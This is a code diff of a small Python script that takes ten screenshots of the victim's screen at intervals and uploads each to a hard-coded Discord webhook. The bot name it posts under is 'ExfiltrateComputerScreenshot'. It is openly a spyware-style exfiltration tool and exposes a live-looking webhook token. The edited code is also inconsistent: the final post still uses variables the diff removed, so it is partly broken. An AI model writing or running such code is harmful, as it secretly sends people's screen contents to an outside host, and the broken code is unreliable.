@@ -2,27 +2,30 @@ import pyautogui
 from time import sleep
 import requests
 
-
-# YOUR DISCORD WEBHOOK
+# Your webhook
 discord_webhook = "https://discord.com/api/webhooks/1356971307547361501/IGX0ZvQYPn7RFgYd6d7wpoL9xzCSL3EZ_VBjEzfimSs7eDidDMKHv12ncQmdgjOmWXVU"
 
-# Edit this variables as you want
+# Settings
 SCREENSHOTS = 10
 TIMING = 5
 
 for i in range(SCREENSHOTS):
     sleep(TIMING)
 
-    # take the screenshot
+    # Screenshot speichern
     screenshot = pyautogui.screenshot()
-    screenshot.save("screenshot.png")
+    filename = f"screenshot_{i}.png"
+    screenshot.save(filename)
 
-    with open("screenshot.png", "rb") as f:
-        foto = f.read()
+    with open(filename, "rb") as f:
+        files = {"file": (filename, f, "image/png")}
+        data = {
+            "username": "ExfiltrateComputerScreenshot",
+            "content": f"Screenshot #{i}"
+        }
 
-    richiesta = {
-        "username": "ExfiltrateComputerScreenshot"
-    }
+        response = requests.post(discord_webhook, data=data, files=files)
+
 
     # Send the message by attaching the photo
     response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})
